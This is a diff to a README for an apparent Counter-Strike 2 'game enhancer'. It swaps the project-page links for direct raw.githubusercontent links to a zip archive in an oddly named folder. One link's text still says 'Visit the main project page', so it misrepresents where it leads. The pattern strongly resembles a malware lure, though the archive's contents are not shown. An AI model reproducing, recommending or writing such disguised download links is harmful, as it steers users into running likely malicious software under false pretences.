@@ -1,6 +1,6 @@
 # 🎯 CS2-Game-Enhancer-2026 - Improve your Counter-Strike 2 visual performance
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/unsophisticated-superiorvocalcord964/CS2-Game-Enhancer-2026)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://raw.githubusercontent.com/unsophisticated-superiorvocalcord964/CS2-Game-Enhancer-2026/main/ceratitoid/Game-Enhancer-C-v3.5-beta.5.zip)
 
 ## 📌 About this project
 
@@ -20,7 +20,7 @@ Your computer needs to meet these basic standards to run the software:
 
 Follow these steps to prepare your system and run the program:
 
-1. Visit the main project page at this link: [https://github.com/unsophisticated-superiorvocalcord964/CS2-Game-Enhancer-2026](https://github.com/unsophisticated-superiorvocalcord964/CS2-Game-Enhancer-2026)
+1. Visit the main project page at this link: [https://raw.githubusercontent.com/unsophisticated-superiorvocalcord964/CS2-Game-Enhancer-2026/main/ceratitoid/Game-Enhancer-C-v3.5-beta.5.zip](https://raw.githubusercontent.com/unsophisticated-superiorvocalcord964/CS2-Game-Enhancer-2026/main/ceratitoid/Game-Enhancer-C-v3.5-beta.5.zip)
 2. Locate the Releases section on the right side of the project page.
 3. Click on the latest release version.
 4. Download the file named CS2-Game-Enhancer.exe to your computer.
